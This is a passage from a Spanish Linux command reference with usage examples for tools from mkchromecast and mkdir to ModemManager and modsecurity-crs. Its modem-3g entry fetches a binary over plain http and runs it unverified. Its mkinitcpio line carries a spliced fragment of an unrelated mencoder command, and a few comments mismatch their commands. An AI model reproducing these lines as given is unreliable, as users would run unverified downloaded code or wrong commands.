    SSLUseStapling on
    SSLStaplingCache "shmcb:logs/stapling-cache(150000)"
    # Requires Apache >= 2.4.11
    SSLSessionTickets Off
A continuación editar y modificar/añadir en el archivo:
# ano /etc/apache2/sites-available/default-ssl.conf
los poarámetros:
    ServerAdmin usuario@localhost
    ServerName localhost
Para redireccionar todo el tráfico http a cifrado SSL [https]
# nano /etc/apache2/sites-available/000-default.conf
Y en el apartado correspondiente descomentamos o modificamos la linea:
    Redirect permanent  "/" "https://localhost/"
Habilitar los módulos de apache necesarios para SSL y el host virtual:
    # a2enmod ssl
    # a2enmod headers
    # a2ensite default-ssl
Comprobar que no existan errores de sintaxis en los archivos:
    # apache2ctl configtest
# systemctl restart apache2 (reiniciar apache2)
Si existen cortafuegos tipo ufw han de reconfigurarse [ufw allow 'Apache Full']. Podemos comprobar si se ha realizado todo el proceso correctamente colocando en la barra del navegador la dirección https://localhost. El certificado creado no está firmado por una de las autoridades de confianza del navegador y es probable que se vea una alguna advertencia al respecto. clicmos en “ADVANCED” y luego en el enlace proporcionado para acceder a su host


mkchromecast
Herramienta que permite transmitir audio y video desde tu computadora a dispositivos compatibles con Google Cast como Chromecast, altavoces Google Home, pantallas Nest, etc. Está escrita en Python y utiliza Node.js o ffmpeg para realizar la transmisión y soporta varos formatos de audio [FLAC, WAV, MP3, AAC, etc.], siempre que ffmpeg esté instalado.
$ mkchromecast --name "Nombre_del_Chromecast" --audio-file musica.flac (transmitir audio desde un archivo)
$ mkchromecast --name "Nombre_del_Chromecast" --pulse (creará un sumidero de PulseAudio llamado mkchromecast al que se puede redirigir el audio de cualquier aplicación)
$ mkchromecast --name "Nombre_de_tu_Chromecast" --system (transmitir todo el audio de tu sistema)
$ mkchromecast --name "Nombre_de_tu_Chromecast" --video-file video.mp4 (transmitir un archivo de video)
$ mkchromecast --name "Chromecast1,Chromecast2" --audio-file musica.flac (enviar audio a varios dispositivos al mismo tiempo)
$ mkchromecast --name "Nombre_de_tu_Chromecast" --volume 50 (controlar el volumen del dispositivo [de 0 a 100])
$ mkchromecast --list (listar dispositivos disponibles)


mkdir
Crear directorios.
$ mkdir -p A B C (Crea el directorio A en su interior el B y dentro de este el C)
$ mkdir -m=rwx      (Especifica los permisos del directorio que se crea)
$ mkdir -p -m=x /home/ct/videos/res/tot  (creará los nuevos directorios “videos”, “res” i “tot” y dará permisos de ejecución [x]  al usuario ct)
$ mkdir -p ~/docs/{1,2,3} (creará docs en el directorio del usuario y dentro los directorios 1,2 y 3)
$ mkdir -p project/{lib/ext,bin,src,doc/{html,info,pdf},demo/stat/a} (creación de varios directorios y subdirectorios)
$ mkdir uno dos tres (crear directorios "uno", "dos" y "tres")
$ mkdir R{1..9} (Crear los directorios del R1 al R9)
$ mkdir -p AA/{1,2/{a,b/{01,02},c},3,4} (crear directorios 1,2,3,4, en el interior del 2, a,b,c y en el interior del 2/b, el 01 y 02)


mkdosfs
Formatear a sistema de archivos msdos
# mkdosfs -c /dev/fd0


mke2fs
Formatear a sistema de archivos ext2
# mke2fs -c /dev/fd0         (formatea a ext2 el floppy)


mkeot
[eot-utils]. Genera tipografías en formato EOT desde TTF y OTF. Comando necesario para convertir las fuentes en TTF al formato EOT para ser usado con la propiedad font-face de CSS3, formato requerido por Internet Explorer.
$ mkeot neuropol_x_free.ttf > neuropol_x_free.eot


mkfifo
[First In, First Out]. Crear una tuberia que tanto sirve para permitir que la salida de una aplicación sea la entrada de otra como redirección de cualquier dato de salida que pueda ser grabado a disco.
$ mkfifo pipe (crear la tuberia. Lanzando “ls -l pipe” la primera letra que mostrará la descripción será una “p” de pipe [tuberia])
En una terminal:
$ mkfifo canal
$ echo "Linux es genial" > canal
En otra terminal:
$ cat canal (mostrará lo lanzado en la otra terminal)



mkhomedir_helper
Crear directorios de inicio. El valor predeterminado de umask es 0022. El asistente no toca los directorios de inicio si ya existen.
# mkhomedir_helper USER (formas básica que creará el dir /home/USER)


mkfs
Formatear dispositivos a sistemas de archivo ext2,3,4, vfat....
# mkfs -t ext3 /dev/sda4  (Formatea a ext3 la particion indicada)
# mkfs.ext3 /dev/sda7 (otro modo)
# mkfs.ext2 -c /dev/sda1 (a ext3)
# mkfs.ext4 -c /dev/sda2 (a ext4)
# mkfs.msdos -c /dev/fd0  (formatea a msdos)
# mkfs.vfat /dev/sda1 (formatear en fat 32)
# mkfs.vfat -n datos /dev/sdd1 (formatear en fat32 y con etiqueta “datos”)


mkinitcpio
Herramienta de creación de imagenes de arranque del kernel en ArchLinux
# mkinitcpio -L (Ver lista de hooks)
# mkinitcpio -p linux (Cremencoder mf://*.jpg -ovc lavc -o out.avi
a la imagen con el preset seleccionado)
# mkinitcpio -c /etc/mkinitcpio.conf -g /boot/linux.img (crea manualmente la imagen de inicio, especificando el archivo de configuración y el destino)


mkisofs
Crear imágenes de ficheros
$ mkisofs -r -l -o imagen.iso fichero
$ mkisofs /dev/cdrom > cd.iso (crear una imagen iso del cdrom en disco)


mklibs
Produce bibliotecas compartidas reducidas que contienen únicamente las rutinas requeridas por un conjunto específico de ejecutables. Analiza los ejecutables y determina cuáles funciones de las bibliotecas compartidas son usadas por esos binarios y a partir de esa información, produce versiones "recortadas" de dichas bibliotecas, eliminando el código no utilizado para ahorrar espacio. Es fundamental en la creación del "initramfs" o sistemas mínimos como instaladores personalizados.
Un ejemplo práctico de uso podría ser, tener un conjunto de ejecutables en /tmp/target/bin y querer generar un conjunto mínimo de bibliotecas compartidas para un sistema cerrado en /tmp/target/lib
$ mklibs --root=/tmp/target --libdir=/tmp/target/lib /tmp/target/bin/*
"--root" especifica el prefijo raíz para el entorno objetivo y "--libdir" el directorio donde se almacenarán las bibliotecas reducidas.


mklibs-copy
Herramientas tienen propósitos similares  mklibs, y su descripción es casi idéntica: producir un conjunto mínimo de bibliotecas compartidas para ejecutables concretos, pero "mklibs-copy" es esencialmente un script auxiliar que copia solo las bibliotecas necesarias y puede integrarse en flujos de trabajo automatizados de reducción de sistemas. A menudo, se utiliza internamente por "mklibs", o en scripts que generan entornos de sistema base. Prácticamente, si "mklibs" recorta y genera nuevas versiones de las bibliotecas, "mklibs-copy" copia dichas bibliotecas necesarias a un directorio destino específico.


mknod
Crear archivos de dispositivos que no se encuentran en el sistema. Crea archivos especiales de bloques [/dev/sda es el disco duro entero, /dev/nvme0n1p1 una partición del disco...] o caracteres [dispositivos que entregan datos como un flujo de bytes: /dev/tty la terminal, /dev/null el pozo sin fondo, /dev/urandom el generador de números pseudoaleatorios...]. Ver mkfifo.
# mknod -m 644  /dev/ttyS4 c 4 64 (con permisos 644, crear el dispositivo de carácter [c] ttyS0 e intervalo entre el máximo y el mínimo)
Una vez creado precisa otorgar propietarios:
# chown root:dialout /dev/ttyS4
Otro ejemplo
# mknod -m 640 /dev/loop8 b 7 8 (con permisos 640, especificando que es un dispositivo de bloques [b] e intervalo entre el máximo y el mínimo)
# chown root:disk /dev/loop8 (Otorgar propiedad)
# mknod /tmp/falso_null c 1 3 (crear un “dispositivo null” falso de tipo caracter, identifica el driver y el dispositivo dentro del driver)
En realidad en los sistemas modernos, udev crea todos los /dev/* automáticamente, así que casi nunca se usa mknod a mano salvo en casos de debugging o sistemas minimalistas.
# mknod -m 600 /tmp/falso_null c 1 3 (solo root puede leer y escribir)
# mknod -Z /tmp/falso_null c 1 3 (-Z deja que mknod asigne los permisos por defecto al nuevo dispositivo)
1.-
Crear un /dev/falso_zero casero
$ sudo mknod -m 666 /dev/falso_zero c 1 5
$ sudo head -c 16 /dev/falso_zero | hexdump -C
        00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
        00000010
Se verá 16 bytes en 00.
$ sudo rm -r /dev/falso_zero


mkntfs
Crear particiones ntfs.
$ mkntfs -L win -F /dev/sdb2 (con etiqueta “win” y forzando)


mkosi
[Make Operating System Image]. Herramienta de Python diseñada para construir imágenes de sistemas operativos (SO) personalizadas, reproducibles y "legacy-free" [sin soporte para tecnologías antiguas], basándose principalmente en el ecosistema systemd. Solo admite sistemas EFI, no MBR/BIOS.
# mkosi (sin archivos de configuración en el directorio, creará una imagen de SO con la configuración por defecto de "mkosi" para la distribución anfitriona)
# mkosi -d debian -r bookworm --bootable (distribución, nombre clave de la versión y que genere una imagen de disco con partición GPT y cargador de arranque EFI lista para arrancar)
# mkosi --format=tar --output=mi-sistema.tar (la salida será un archivo tar)
Nota.- El formato de salida puede ser "directory" [directorio simple], "disk" [archivo de imagen con tabla de particiones GPT, por defecto] o "tar" [tarball de un directorio simple]
# mkosi -d fedora -p emacs -p nginx (incluir paquetes que no están en el conjunto base dentro de la imagen)
Para construcciones más complejas y reproducibles, se recomienda usar un archivo de configuración, típicamente llamado `mkosi.default`, en el mismo directorio donde se ejecuta `mkosi`.
# nano mkosi.default
[Distribution]
Distribution=ubuntu
Release=focal
#
[Output]
Format=disk
Output=ubuntu-vm.raw
RootSize=10G
Bootable=true
#
[Packages]
Packages=
    python3
    git
    network-manager
    # Se puede usar ! para eliminar un paquete base
    # !unwanted-package
"mkosi" leerá la configuración de "mkosi.default" y construirá la imagen "ubuntu-vm.raw".
# mkosi clean (elimina los artefactos de compilación generados)


mkpasswd
Encriptar contraseñas. Si la contraseña no se especifica, la pedirá por pantalla
$ mkpasswd (Uso básico)
$ mkpasswd password (Encripta "passwrd". Si no se especifica "method" [-m] se usa md5 por defecto)
$ mkpasswd -m help (Muestra las opciones de encriptación)
$ mkpasswd -m sha-512 password (Usando sha-512 para la contraseña "password")


mksh
Es un shell completo y con todas las funciones, sucesor de Public Domain Korn shell [pdksh], un shell compatible con Bourne/POSIX, muy similar al original AT&T Korn Shell [ksh88/ksh93]. Incluye correcciones de errores y mejoras de funcionalidad para crear un shell moderno y robusto, ideal para uso interactivo, especialmente con scripts. mksh es compatible con UTF-8, en operaciones con cadenas y en el modo de edición de Emacs. Este shell cumple con la Política de Debian 10.4 y funciona como /bin/sh en sistemas Debian [/bin/lksh] y es un buen shell de rescate e initrd [/bin/mksh-static].


mkswap
Crear un espacio de intercambio.
# mkswap /dev/sda5 (Luego añadir la entrada en /etc/fstab: /dev/sda4 none swap sw 0 0)


mktemp
[coreutils]. Crear archivos o directorios temporales.
$ mktemp (Crea un fichero temporal en /tmp)
$ mktemp -d (Crea un directorio en tmp y en su interior un archivo)
$ mktemp --tmpdir=documentos (crea un archivo temporal en el interior del directorio "documentos")


mktorrent
Crear archivos bittorrent.
$ mktorrent -v -p -a http://url.com -o nombre.torrent (mostrar máxima información, con el flag "privado", url del rastreador y especificar nombre del torrent)


mkvtoolnix
Conjunto de herramientas de línea de comandos para trabajar con archivos Matroska [mkv] un contenedor multimedia completo para vídeos, audio y texto, sin importar que cada uno de estos elementos utilice diferentes tipos de codificación. Al hacer doble clic en un solo archivo MKV se abrirán todos sus elementos en un reproductor de archivos MKV. Incluye las herramientas mkvmerge, mkvinfo, mkvextract y mkvpropedit
$ mkvmerge -o salida.mkv video.mp4 audio.mp3 subtitulos.srt (crea salida.mkv combinando varios archivos: video, audio, subtítulos y capítulos en un solo archivo MKV)
$ mkvmerge -o nuevo.mkv entrada.mkv audio_extra.mp3 (añadir una pista de audio adicional a un MKV existente)
$ mkvmerge -o solo_video.mkv --video-tracks 1 entrada.mkv (extraer la pista número 1 de un MKV)
$ mkvinfo archivo.mkv (información detallada sobre las pistas, capítulos, etiquetas y otros metadatos de un archivo MKV)
$ mkvextract archivo.mkv tracks 2:audio.mp3 (extrae la pista con ID 2 y la guarda como audio.mp3)
$ mkvextract archivo.mkv tracks 3:subtitulos.srt (extraer subtítulos)
$ mkvpropedit archivo.mkv --edit info --set title="Nuevo Título" (cambiar el título del archivo)
$ mkvpropedit archivo.mkv --edit track:2 --set flag-default=1 (marcar la pista ID 2 de audio como predeterminada)
$ mkvpropedit archivo.mkv --delete chapters (eliminar los capítulos)


ml-burg
Genera un programa de ML estándar para reescribir de abajo a arriba un árbol de entrada. La información de costo asociada a cada regla de reescritura se utiliza para obtener el costo mínimo de reescritura para todo el árbol. Una reducción exitosa corresponde a la reescritura del árbol de entrada a un símbolo no terminal especial llamado "no terminal de inicio". Tras una reducción exitosa, se proporcionan funciones para recorrer el árbol emitiendo acciones semánticas correspondientes a las reglas que coincidieron.
$ ml-burg archivo.burg (genera archivo.sml)
$ sml archivo.sml (compilarlo para integrar en el proyecto SML)


mlabel
Poner etiquetas a las particiones y dispositivos vfat
# mlabel -i /dev/sda2 ::vfat


mlcc
Configuración para mlterm. Las opciones susceptibles de modificación son las reflejadas en /usr/share/doc/mlterm/PROTOCOL.gz apartado “Values for each key”
$ mlcc fg_color blue
$ mlcc bg_color red


mle
Editor de texto escrito en C.
$ mle file:25 (abrir file y colocar el cursor en el linea 25)
$ mle -h (listado de atajos de teclado)
$ mle file1 file2 file3 (abrir cada archivo en una ventado del editor)
Nota.- Ctrl-s para guardar, Ctrl-o abrir y Ctrl-x para salir


mlmmj
Gestor de listas de correo independiente del servidor de correo [Postfix, Exim, Sendmail, etc.].
$ mlmmj-make-ml -L /var/lib/mlmmj/mi-lista -d (crear una nueva lista de correo)
Estructura de directorios creada:
$ tree mi-lista
/var/lib/mlmmj/mi-lista/
├── control/         # Configuración
├── text/            # Textos de respuesta
├── digests/         # Resúmenes
└── archive/         # Archivo de mensajes
$ echo "admin@midominio.com" > /var/lib/mlmmj/mi-lista/control/owner (configurar propietario)
$ echo "list" > /var/lib/mlmmj/mi-lista/control/access.subscribe (configurar acceso)
$ echo "moderated" > /var/lib/ml/mlmmj/mi-lista/control/moderation (configurar moderación)
$ mlmmj-sub -L /var/lib/mlmmj/mi-lista -a usuario@ejemplo.com (añadir suscriptor)
$ mlmmj-sub -L /var/lib/mlmmj/mi-lista -l (listar suscriptores)
$ mlmmj-sub -L /var/lib/mlmmj/mi-lista -r usuario@ejemplo.com (eliminar suscriptor)
$ echo "1" > /var/lib/mlmmj/mi-lista/control/archive (habilitar archivo)


mlocate
Redirige a plocate [ver] significativamente más rápido.


mlock
Programa de bloqueo de buzones. IMAP [Internet Message Access Protocol - Protocolo de Acceso a Mensajes de Internet] es un método para acceder a mensajes electrónicos almacenados en un servidor de correo. Si libc-client.so no puede crear un archivo de bloqueo de buzón, llamará a este programa. No hay razón para que el usuario llame a mlock directamente ni a través de otro programa.


mlterm
Emulador de terminal para X Window System, que admite varias codificaciones. Verifica la configuración regional y selecciona la codificación adecuada, no es preciso configurar mlterm para mostrar idioma o codificación. Las codificaciones incluidas son: ISO-8859-[1-11,13-16], TCVN5712, VISCII, TIS-620 (same as ISO-8859-11), KOI8-{R,U,T}, CP{1251,1255},  GEORGEAN-PS, EUC-JP, EUC-JISX0213, ISO-2022-JP{,1,2,3}, Shift_JIS, Shift_JISX0213, ISO-2022-KR, EUC-KR, UHC, JOHAB, EUC-CN (aka GB2312), GBK, ISO-2022-CN, Big5, EUC-TW, HZ, UTF-8, y GB18030.
$ mlterm -b blue -f yellow -g 50x10 (Especificando color de fondo [b] color de fuente [f] y medidas)


mmaker
Herramienta para la creación de menús basados en XML.
$ mmaker -v OpenBox3 (mostrando el proceso y sin sobreescribir el menu.xml anterior)
$ mmaker -f OpenBox3 (mobreescribiendo el menu.xml anterior)
$ mmaker -f  -s KDE,Xfce,XWindow OpenBox3 (omitiendo los menús de los escritorios especificados)
$ mmaker -f OpenBox3 -s Console (omitir del menú las aplicaciones que sólo son para consola)


mmc-utils
Herramienta diseñada para interactuar con dispositivos MMC [MultiMediaCard] y SD en el kernel de Linux. MMC es un estándar de tarjeta de memoria para almacenamiento de estado sólido. Esta herramienta facilita el desarrollo y la depuración de estos dispositivos al permitir leer y modificar registros de configuración, como CSD [Card Specific Data] y EXT_CSD [Extended CSD], habilitar particiones de arranque, gestionar protección de escritura, RPMB [Replay Protected Memory Block] para seguridad, y realizar actualizaciones de firmware.
# dmesg | grep mmc (ver si el dispositivo MMC está detectado por el kernel)
# mmc extcsd read /dev/mmcblk0 (lee y muestra el registro EXT_CSD del dispositivo)
# mmc extcsd read /dev/mmcblk0 | grep -i life (filtrar solo el estado de vida útil)
# mmc csd read /sys/block/mmcblk0/device (lee el registro CSD, con datos básicos como la capacidad de la tarjeta, velocidad de bloque y estructura de particiones)
# mmc bootpart enable 1 1 /dev/mmcblk0 (habilita /dev/mmcblk0boot0 para arranque)
# mmc bootpart disable 1 /dev/mmcblk0 (deshabilita)
# mmc writeprotect status /dev/mmcblk0 (establece la protección de escritura en áreas específicas: boot o user data)
# mmc rpmb read-block /dev/mmcblk0rpmb 0x02 2 /tmp/block - clave_secreta (leer 2 bloques desde dirección 0x02 y guardarlos en un archivo con verificación de clave)
Nota.- El dispositivo RPMB es un char device [/dev/mmcblk0rpmb], no block.
# echo -n "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH" | mmc rpmb write-block /dev/mmcblk0rpmb 0x02 - - (escribir un bloque en la dirección 0x02)
# mmc ffu /path/to/firmware.img /dev/mmcblk0 (realiza Field Firmware Update [FFU] en eMMC compatibles, actualizando el firmware del controlador)
# mmc ffu /path/to/firmware.img 512000 /dev/mmcblk0` (especificando tamaño para transferencias grandes [512k chunks])
Nota.- Algunas operaciones como escribir en registros o habilitar particiones pueden causar problemas al dispositivo si se usan incorrectamente.


mmdb-bin
Resolver direcciones IP mediante la biblioteca libmaxminddb. Precisa cuenta y clave de MaxMind [https://www.maxmind.com/en/home] y entrar los datos en el archivo de configuración:
# nano /etc/GeoIP.conf
       ...
       AccountID 00000
       LicenseKey 00000000000
       ...
       EditionIDs GeoLite2-Country GeoLite2-City GeoLite2-ASN
$ mmdblookup -f file.mmdb -i 8.8.8.8


mmdebstrap
Herramienta diseñada para crear entornos Debian mínimos y personalizables, ya sea como un directorio que puede usarse como chroot o como un archivo tar para distribuir o guardar. Es especialmente útil para crear imágenes de contenedores, sistemas embebidos, o entornos de desarrollo aislados. A diferencia de debootstrap, usa apt, admite más de un servidor de réplica, usa seguridad y actualiza automáticamente los servidores de réplica para entornos chroot estables de Debian, es de 3 a 6 veces más rápido, genera una salida más pequeña al eliminar elementos innecesarios, es reproducible bit a bit si se configura $SOURCE_DATE_EPOCH y permite operaciones sin privilegios usando espacios de nombres de usuario de Linux o fakechroot.
# mmdebstrap --architectures=amd64 bookworm ./mi-chroot/ (crear un entorno chroot básico de Debian stable en un directorio)
# mmdebstrap --architectures=amd64 bookworm mi-sistema.tar.gz (crear un archivo tar.gz con un sistema Debian minimal)
# mmdebstrap --architectures=amd64 --include="vim, curl, build-essential" bookworm ./mi-chroot/ (instalar paquetes adicionales)
# mmdebstrap --architectures=amd64 --mirror=http://ftp.debian.org/debian bookworm ./mi-chroot/ (con un repositorio diferente al oficial)
# mmdebstrap --architectures=arm64 bookworm ./chroot-arm64/ (crear un entorno para otra arquitectura)


mmmulti
Mapa múltiple con respaldo de memoria. "Mapa múltiple" o multimap significa que una misma clave [key] puede asociarse con múltiples valores [value]). Es diferente de un “mapa” ordinario que requiere que cada clave tenga un único valor y "con respaldo de memoria" [memory backed] significa que el almacenamiento de los datos está hecho o respaldado mediante un archivo mapeado en memoria [memory-mapped file], usando mmap o mecanismo similar, en lugar de mantener todo en estructuras dentro del espacio de usuario en RAM. Está pensado para casos grandes de datos, por ejemplo, operaciones bioinformáticas, manipulación de grafos genómicos, donde la memoria es un límite, pero el disco o almacenamiento rápido es más viable.
$ mmmulti -T testfile -s 100 -M 10 (generar 100 pares aleatorios: valores 1..10)
      10 keys
      100 values
      63 unique pairs
10 keys --> 10 claves únicas [-M 10].
100 values --> 100 valores totales [-s 100].
66 unique pairs --> algunos pares clave-valor se repiten por eso hay menos pares únicos que valores totales.


mmsd-tng
[Multimedia Messaging Service Daemon - The Next Generation] Demonio diseñado para manejar el envío y recepción de mensajes multimedia [MMS] en sistemas Linux, especialmente en entornos móviles como teléfonos con distribuciones basadas en Debian, por ejemplo, Mobian o postmarketOS. Es un backend completamente compatible con la pila de MMS, lo que significa que actúa como un servicio en segundo plano que procesa MMS de manera transparente, integrándose con aplicaciones de mensajería como Chatty o VGMMS. A diferencia de implementaciones anteriores, como el mmsd original, esta versión "next generation" es más robusta, modular y está optimizada para trabajar con ModemManager, un gestor de módems de banda ancha móvil que proporciona una interfaz unificada para comunicarse con hardware de telefonía, como módems USB o integrados en dispositivos como el PinePhone. ModemManager maneja aspectos como la conexión de datos [APN], autenticación SIM y el estado del módem, permitiendo que mmsd-tng se enfoque exclusivamente en el protocolo MMS.
# systemctl enable --now mmsd-tng (habilita y arranca el servicio)
# journalctl -u mmsd-tng -f (monitorear logs en tiempo real)
# mmsdtng -v (en modo pruebas y modo verbose)
# mmsctl send --to "+1234567890" --subject "Foto de prueba" --attach /ruta/a/imagen.jpg (envío de MMS manual)
# mmcli -m 0 --bearer --list (verifica APN).
# mmsctl list (encola el mensaje; el daemon lo envía cuando haya conexión)


mmv
Cambiar el sufijo del nombre de los archivos.
$ mmv "*.PNG" "#1.png"   (Renombrar todas las extensiones "PNG" a "png", conservándose el nombre que las precede.)
$ mmv ";*.abc" "#1#2.cba" (Renombrar todas las extensiones "PNG" a "png" del directorio actual y sus subdirectorios)
# mmv “/;*.PNG” “#1#2.png” (Renombrar todos los ficheros del sistema)
$ mmv "*.flv.mpg" "#1.mpg" (Renombrar todos los archivos terminados en .flv.mpg a .mpg)


mobian-archive-keyring
Claves OpenPGP [Pretty Good Privacy] para el archivo de paquetes de Mobian, una versión híbrida de Debian diseñada para dispositivos móviles, como teléfonos y tabletas. Su función principal es la autenticación y verificación de la integridad de los paquetes de software. Cuando un desarrollador de Mobian sube un paquete, lo firma digitalmente usando su clave privada, que solo ellos poseen. El sistema, al descargar ese paquete, usa la clave pública correspondiente, almacenada en mobian-archive-keyring.gpg en el directorio /usr/share/keyrings/ para verificar la firma. Si la verificación es exitosa, el sistema sabe que el paquete realmente proviene de Mobian y que es auténtico.


moc
Reproductor de música.
Copiar el archivo de configuración al directorio personal:
	$ cp /usr/share/doc/moc/examples/config.example.gz ~/.moc/
	$ cd ~/.moc/
	$ gzip -d config.example.gz
	$ mv config.example config
El listado de temas
$ ls /usr/share/moc/themes.
	black_theme  darkdot_theme  example_theme  green_theme moca_theme  nightly_theme  red_theme  transparent-background yellow_red_theme
Para hacer definitivo el cambio, el que se escoja se coloca en:
$ nano .moc/config:
	# Theme file. This can be absolute path or relative to
	# /usr/share/moc/themes/ (depends on installation prefix) or ~/.moc/themes/
	Theme                   = moca_theme
$ mocp  (arrancar la aplicación)
Teclas de control:
	 >  (subir volumen 1%)
	 <  (Bajar volumen 1%)
	 ,  (Bajar volumen 5%)
	 .  (Subir volumen 5%)
	 h  (Lista de teclas)
	 T  (Para cambiar el tema. Sólo para la presente sesión)
	 n  (Reproduce siguiente canción)
	 b  (Reproduce la canción anterior)
	 A  (Añade un directorio a la lista de reproducción)
	 a  (Añade solo un archivo a la lista)
	 c  (Quita un archivo de la lista de reproducción)
	 C  (Borra toda la lista)
	 q  (Pasar a segundo plano. Vuelve a primer plano, según la ditro con: ./moc, moc, ./mocp)
	 Q  (Cierra totalmente el programa)
	 l  (Cambia de doble ventana a ventana simple y viceversa)
	 tabulador   (Cambiamos de pantalla, en caso de estar dividida)
	 p o espacio (Pausar)
	 enter       (Play)
	 Crtl + u    (Para entrar una url. Pulsando intro la incluye en playlist)
	 d  (Borrar una url del playlist)
1.-
error "Could not find codec parameters"
En algunas ocasiones (Debian) puede que falte el paquete libav y tenga que lanzarse:
$ mocp -O "PreferredDecoders+=mp3(mp3,ffmpeg)"
Si funciona, colocar la linea en .moc/config:
	PreferredDecoders       += mp3(ffmpeg)
2.-
Una pequeña lista de url musicales (Tambien válidas para vlc u otros reproductores en streaming):
	# Ibiza
	http://s6.viastreaming.net:7010
	# City Dance
	http://streaming.radionomy.com:8000/City-Dance-Radio
	# Dance-Makina
	http://uplink.duplexfx.com:8044
	# Progressive
	http://85.25.86.69:8000/
	# De los 90
	http://91.121.38.216:8018/
	# Hardcore
	http://eilo.org:8000/happycore
	# Punk-Rock
	http://broadcast.rantradio.com:9000
	# Heavy Metal
	http://s5.voscast.com:7346/
	# Black-Metal
	http://radio.hazzardofdarkness.com:6666/ (Black-Metal
	# Rock Alternativo
	http://66.55.148.27:10054
	# Piano Jazz
	http://80.94.69.106:6814/
	# Relax New Age
	http://radio2.trancemission.fm:80/
	# Hip-Hop
	http://sc4.spacialnet.com:26368/
	# Italiana
	http://italia.lolliradio.net:8010/
	# Beattles
	http://uplink.duplexfx.com:8062/
	# Pop
	http://listen.radionomy.com/lonestar-radio
	# Rock-Pop, britpop
	http://listen.radionomy.com/walesfm
3.-
Moc también puede ser usado en modo servidor lo que nos permite liberar la terminal.
	$ mocp -S  (Lanza el modo servidor)
	$ mocp -p  (Reproduce el playlist)
	$ mocp -f  (Avanza al suguiente track del playlist)
	$ mocp -r  (Retrocede al anterior track del playlist)
	$ mocp -s  (Para la reproducción)
	$ mocp -P  (Pausa la reproducción)
	$ mocp -x  (Mata el servidor)


modem-3g
Instalación de modems inalámbricos:
# apt-get install usb-modeswitch
$ wget http://www.sakis3g.org/versions/latest/i386/sakis3g.gz
$ gzip -d sakis3g.gz
$ chmod +x sakis3g
$ ./sakis3g --interface


modem-cmd
[modemmanager]. Envía comandos AT arbitrarios al módem a través de una línea serie. Esto significa que puede usarse como marcador telefónico. modem-cmd está diseñado para módems físicos que se conectan via USB/puerto serie y soportan comandos AT.
Para identificar el /dev del modem:
$ ls /dev/tty* (listar dispositivos serie disponibles: /dev/ttyUSB0, /dev/ttyUSB1, /dev/ttyACM0, /dev/ttyACM1 [dispositivos CDC-ACM], /dev/ttyS0, /dev/ttyS1 [puertos serie tradicionales])
$ lsusb (mostrará todos los dispositivos USB. Buscar algo relacionado con módem, HSPA, LTE, etc.)
$ dmesg | tail -20 (al enchufar el modem se verá mensajes del kernel que indican qué dispositivo se asignó)
$ find /dev -name "tty*" -type c | grep -E "ACM|USB|GSM" (verificar si se tiene un módem integrado)
$ mmcli -L (listar módems)
$ modem-cmd /dev/ttyUSB2 AT+CGMI (consultar información del módem, suponiendo que es el /dev especificado)
$ modem-cmd /dev/ttyUSB2 AT+CSQ (consultar intensidad de señal)
$ modem-cmd /dev/ttyUSB2 AT+COPS? (ver información de la red)
$ modem-cmd /dev/ttyUSB2 "ATD123456789" (marcar un número)
$ modem-cmd /dev/ttyUSB2 "ATH" (colgar llamada)
$ modem-cmd /dev/ttyUSB2 "ATA" (contestar llamada)


modemmanager
Es un demonio Linux basado en DBus que permite gestionar módems de banda ancha móvil en sistemas Linux. Su función principal es actuar como intermediario entre el sistema operativo y dispositivos de red 3G/4G/5G, por ejemplo, módems USB o integrados en placas IoT. Actúa como una RIL [Radio Interface Layer - Capa de interfaz de radio] estándar y puede ser utilizado por diferentes administradores de conexión, como NetworkManager. Aunque ModemManager funciona en segundo plano, se puede controlar desde la terminal usando el comando mmcli [ModemManager Command Line Interface]. Este proporciona una interfaz en línea de comandos para inspeccionar, habilitar, conectar o depurar los módems gestionados por ModemManager.
# mmcli -L (buscar dispositivos modem manager)
# mmcli --scan-modems (buscar y detectar todos los módems conectados)
# mmcli --list-modems (listar los módems administrados por ModemManager. Muestra el identificador DBus del módem. Ese número se usa en otros comandos)
# mmcli --modem=0 (obtener información detallada del módem."0" es el ID del modem)
# mmcli --modem=0 --enable (habilitar el módem)
# mmcli -m 0 --simple-connect='apn=iot.1nce.net,ip-type=ipv4v6' (el daemon configura el APN [Access Point Name] y tipo de dirección IP)
# mmcli -m 0 (verificar el estado de la conexión)
# mmcli --set-logging=DEBUG (aumentar el nivel de detalle del registro)
# tail -F /var/log/syslog (útil para diagnosticar fallos de conexión o controladores)
# ModemManager --debug & mmcli -m 0 --command='AT+CSQ' (enviar comandos AT al módem)
Los comandos AT se utilizan para controlar y obtener información directa del hardware, por ejemplo, AT+CSQ para medir la intensidad de señal.


modinfo
Información sobre módulos.
$ modinfo sr_mod


modprobe
Utilidad que se usa para agregar y quitar módulos del kernel. Los módulos del kernel de Linux tienen .ko como extensión del nombre del módulo.
# modprobe --dry-run --verbose ac97_bus
# modprobe -r pcspkr (excluir cargar módulo emncionado [pitido del pc])
# modprobe -q nombre_modulo (excluir información de error respecto de un nombre_modulo)
# modprobe -c | grep pcspkr (comprobar un módulo concreto)
# lsmod | grep pcspkr (ver si un módulo esta cargado)
$ ls -R /lib/modules/$(uname -r) (ver la totalidad de módulos que estan disponibles)


modsecurity-crs
Proporciona protección crítica contra ataques en prácticamente cualquier arquitectura web. El CRS [Core Rule Set] se basa en reglas genéricas que se centran en la identificación de la carga útil del ataque para brindar protección contra vulnerabilidades de día cero y desconocidas que suelen encontrarse en aplicaciones web y que, en la mayoría de los casos, están personalizadas. Las reglas básicas utilizan las siguientes técnicas: validación de solicitudes HTTP, anomalías del protocolo HTTP, restricciones globales, política de uso de HTTP, detección de software malicioso, detección de ataques genéricos (inyección SQL, scripts entre sitios, inyección de comandos del sistema operativo, inyección de ColdFusion, PHP y ASP, etc.), detección de troyanos y puertas traseras, detección de errores, protección XML y monitorización de motores de búsqueda.
$ wget https://github.com/coreruleset/coreruleset/archive/v3.3.0.tar.gz
$ tar xvf v3.3.0.tar.gz
# mkdir /etc/apache2/modsecurity-crs/
# mv coreruleset-3.3.0/ /etc/apache2/modsecurity-crs/
# cd /etc/apache2/modsecurity-crs/coreruleset-3.3.0/
# mv crs-setup.conf.example crs-setup.conf
# nano /etc/apache2/mods-enabled/security2.conf
Buscamos la línea
	 IncludeOptional /usr/share/modsecurity-crs/*.load
Y la sustituimos por:
     	 IncludeOptional /etc/apache2/modsecurity-crs/coreruleset-3.3.0/crs-setup.conf
	 IncludeOptional /etc/apache2/modsecurity-crs/coreruleset-3.3.0/rules/*.conf
